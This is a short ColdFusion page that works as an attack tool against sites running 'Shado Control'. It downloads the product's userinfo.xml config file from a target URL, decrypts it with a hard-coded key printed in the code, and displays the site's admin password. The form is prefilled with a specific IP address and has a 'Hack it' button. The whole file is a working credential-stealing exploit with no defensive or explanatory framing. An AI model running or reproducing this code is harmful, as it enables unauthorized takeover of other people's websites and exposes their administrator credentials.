<cfflush interval="20">
<cfif structKeyExists(form, "submitButton")>
	<cfoutput>
	<cfset pathToXml = "/shado-control/app_config/userinfo.xml">
	XML File Downloading from [#form.ShadoURL##pathToXml#]...<br />
	<cfhttp url="#form.ShadoURL##pathToXml#" resolveurl="no"></cfhttp>	
	<cfif cfhttp.statuscode eq "200 OK">
		XML File Downloaded...<br />
		Using plain-text decryption key to hack...<br />
		<cfset scPwd = decrypt(cfhttp.filecontent,"shadocontrolpasswordkey()4")>
		The Shado Control Password for [#form.ShadoURL#] is [#scPwd#]<br />
	<cfelse>
		Download Failed<br />
		<cfdump var="#cfhttp#">
	</cfif>
	</cfoutput>
</cfif>
<br />
<form method="post">
	<table>
		<tr>
			<td>Site using Shado (probably best to use the IP Address:</td>
			<td><input name="shadoURL" type="text" value="210.54.149.123" /></td>
			<td><input name="submitButton" type="submit" value="Hack it &raquo;" /></td>
		</tr>
	</table>
</form>

